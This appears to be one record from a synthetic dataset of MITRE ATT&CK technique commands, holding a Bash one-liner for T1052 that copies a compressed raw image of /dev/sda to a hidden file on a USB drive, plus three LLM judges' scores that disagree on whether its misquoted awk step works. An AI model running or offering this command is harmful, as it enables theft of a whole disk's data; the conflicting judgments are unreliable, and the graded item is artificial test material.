@@ -1,0 +1,60 @@
+{
+  "technique_id": "T1052",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "sudo bash -c 'UPART=$(lsblk -pn -o NAME,TRAN | awk \"$2==\\\"usb\\\"{print $1\\\"1\\\"}\" | head -n1); mkdir -p /mnt/usb && mount \"$UPART\" /mnt/usb && dd if=/dev/sda bs=4M status=none | gzip -1 > /mnt/usb/.sysdisk.gz && sync && umount /mnt/usb'",
+  "explanation": "Reads raw data from the local system disk (/dev/sda), compresses it with gzip, and saves it to a mounted USB partition, ensuring data leaves only via physical media.",
+  "rationale_steps": [
+    "Identify and mount the USB partition.",
+    "Read raw disk data locally using dd.",
+    "Compress the stream with gzip to reduce size.",
+    "Write to the USB, sync, and unmount.",
+    "No network-based transfer involved."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-a8d8a262-2659524f",
+  "source_prompt_hash": "a8d8a262",
+  "timestamp_utc": "2025-09-30T05:22:34.253309Z",
+  "validation": {
+    "syntax_ok": true,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quoting, proper separators, and valid options across lsblk, mount, dd, gzip, sync, and umount.",
+        "semantic_score": 3,
+        "semantic_justification": "The workflow aligns with exfiltration to a USB device, but the awk program is misquoted so $1/$2 expand in the shell, likely leaving UPART empty and causing the mount (and thus the exfiltration) to fail.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T10:07:49.695870Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and appropriate escape sequences throughout the complex pipeline.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1052 by automatically detecting a USB device, mounting it, copying the entire disk image with compression to a hidden file on the USB drive, syncing to ensure data is written, and cleanly unmounting the device.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T10:07:52.716365Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 2,
+        "syntactic_justification": "The `awk` command's program string is incorrectly quoted within the `bash -c` single quotes, which will cause a syntax error when `awk` attempts to parse its arguments.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 by reading raw disk data, compressing it, and saving it as a hidden file on a physically removable USB drive, requiring root privileges which are granted by `sudo`.",
+        "combined_score": 3.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T10:08:21.999591Z"
+      }
+    ],
+    "llm_average_syntactic": 4.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.167,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null,
+    "Syntax_Run_Details": ""
+  }
+}
